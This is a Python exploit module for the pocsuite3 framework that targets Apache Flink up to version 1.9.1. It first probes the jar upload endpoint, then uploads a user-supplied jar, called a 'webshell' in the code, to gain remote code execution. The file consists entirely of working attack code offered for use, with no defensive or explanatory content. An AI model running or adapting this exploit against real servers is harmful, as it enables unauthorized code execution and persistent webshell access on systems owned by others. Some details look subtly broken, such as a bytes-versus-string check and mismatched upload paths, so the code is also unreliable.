#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from pocsuite3.api import OptString
from collections import OrderedDict

class Flink(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-15'
    updateDate = '2019-11-15'
    references = ['']
    name = 'Apache Flink Any Jar Upload Results in Remote Code Execution'
    appPowerLink = ''
    appName = 'Flink'
    appVersion = '<= 1.9.1'
    vulType = 'rce'
    desc = ''' 
    Apache Flink Any Jar Upload Results in Remote Code Execution
    '''

    def _options(self):
        o = OrderedDict()
        o['jp'] = OptString('', description='exp模式需要指定jar包路径', require=False)
        return o

    def _verify(self):
        result = {}
        try:
            if self.url[-1] == '/':
                url = self.url + 'jar/upload'
            else:
                url = self.url + '/jar/upload'
            res = requests.get(url=url, timeout=2)
            flag = 'Unable to load requested file'
            if flag in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Stdout'] = 'The vulnerability exist'
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        result = {}
        try:
            webshell = self.get_option('jp')
            if self.url[-1] == '/':
                url = self.url + 'jars/upload'
            else:
                url = self.url + '/jars/upload'
            f = {'file': open(webshell, 'rb')}
            res = requests.post(url=url, files=f)
            if res.status_code == 200 and 'filename' in res.content:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = url
                result['ShellInfo']['Content'] = webshell
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Flink)